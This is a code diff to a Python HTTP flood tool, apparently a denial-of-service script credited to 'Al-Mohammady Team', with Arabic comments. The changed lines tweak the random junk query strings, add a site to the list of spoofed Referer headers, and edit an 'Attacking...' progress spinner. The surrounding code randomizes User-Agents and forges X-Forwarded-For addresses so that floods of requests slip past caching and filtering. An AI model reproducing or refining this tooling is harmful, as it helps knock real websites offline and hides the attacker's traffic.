@@ -25,7 +25,7 @@ flag = 0
 safe = False
 
 # معلومات الأداة
-__version__ = '2.6 BETA'
+__version__ = '2.7 BETA'
 __author__ = "Al-Mohammady Team"
 __method__ = 'HTTP V2 BETA'
 
@@ -51,7 +51,7 @@ def set_safe():
 def buildblock(size):
     out_str = ''
     for _ in range(0, size):
-        a = random.randint(65, 90)
+        a = random.randint(65, 95)
         out_str += chr(a)
 
     return(out_str)
@@ -66,7 +66,7 @@ def usage():
 
 def httpcall(url):
     """إرسال طلب HTTP."""
-    payload = f"{buildblock(random.randint(3, 15))}={buildblock(random.randint(3, 15))}"
+    payload = f"{buildblock(random.randint(3, 16))}={buildblock(random.randint(3, 16))}"
     request_url = f"{url}?{payload}" if '?' not in url else f"{url}&{payload}"
     headers = {
         "User-Agent": ua.random,
@@ -76,7 +76,7 @@ def httpcall(url):
         "Accept": "*/*",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept-Language": "en-US,en;q=0.9",
-        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]) + f"/?q={buildblock(random.randint(3, 15))}",
+        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com", "https://www.instagram.com"]) + f"/?q={buildblock(random.randint(3, 15))}",
         "DNT": "1",
         "Connection": "keep-alive",
         "X-Forwarded-For": fake.ipv4(),
@@ -95,7 +95,7 @@ def httpcall(url):
 def monitor_requests():
     sent = 0
     previous = 0
-    spinner = Halo(text="Attacking...", spinner="dots")
+    spinner = Halo(text="Attacking... ", spinner="dots")
     spinner.start()
     
     while flag == 0:
